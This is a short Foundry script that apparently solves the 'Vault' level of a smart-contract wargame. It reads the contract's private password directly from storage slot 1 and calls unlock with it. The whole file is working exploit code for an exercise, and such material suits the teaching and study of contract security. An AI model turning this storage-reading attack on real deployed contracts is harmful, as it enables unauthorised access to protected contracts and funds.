// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/08_Vault.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract VaultAttack is Script {
    address target = 0x3b45E62B95Fda1a45C4Cc3224C02E59CEd73417f;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Vault vault = Vault(target);
        console.log("Locked: ", vault.locked());
        bytes32 password = vm.load(target, bytes32(uint256(1)));
        // console.log("Password: ", password);
        vault.unlock(password);
        console.log("Locked: ", vault.locked());
        vm.stopBroadcast();
    }
}
